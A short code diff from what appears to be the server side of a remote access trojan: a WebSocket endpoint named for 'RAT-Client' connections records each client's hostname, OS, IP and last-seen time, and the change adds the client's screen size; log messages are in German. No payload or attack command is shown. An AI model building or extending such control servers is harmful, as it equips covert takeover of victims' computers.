@@ -256,6 +256,7 @@ async def rat_client_endpoint(websocket: WebSocket):
             "os": info.get("os", "Unknown"),
             "ip": info.get("ip", client_ip),
             "last_seen": time.time(),
+            "screen": info.get("screen", {"width": 0, "height": 0})
         }
         
         logging.info(f"[+] RAT-Client verbunden: {hostname} ({client_id}) von {client_ip}")
